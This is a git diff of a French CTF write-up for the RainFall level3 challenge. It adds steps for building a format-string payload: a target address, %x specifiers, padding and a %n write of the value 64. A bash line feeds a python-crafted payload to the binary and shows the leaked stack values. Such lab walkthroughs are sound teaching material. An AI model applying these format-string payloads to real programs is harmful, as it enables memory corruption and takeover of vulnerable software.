@@ -73,6 +73,13 @@ AAAA200 b7fd1ac0 b7ff37d0 41414141 25207825 78252078 20782520 25207825 78252078 
 ```
 Maintenant nous devons remplacer notre buffer de test par l'adresse de la variable `m` et trouver le padding restant a copier dans le buffer pour atteindre 64 caracteres.
 
+Notre payload sera donc composer de :
+		
+	1- L'adresse qu'on souhaite modifier qui ecrit 4 octets
+	2- 3 %x specifiers pour atteindre l'adresse de notre buffer qui vont ecrire 19 octets
+	3- Autant de caractere dont on a besoin pour atteindre la valeur 64
+	4- Le specifier %n pour ecrire la valeur 64 a notre adresse donner en parametre
+
 ```bash
 level3@RainFall:~$ ./level3 <<< $(python -c 'print "\x8c\x98\x04\x08" + "%x" * 3')
 �200b7fd1ac0b7ff37d0
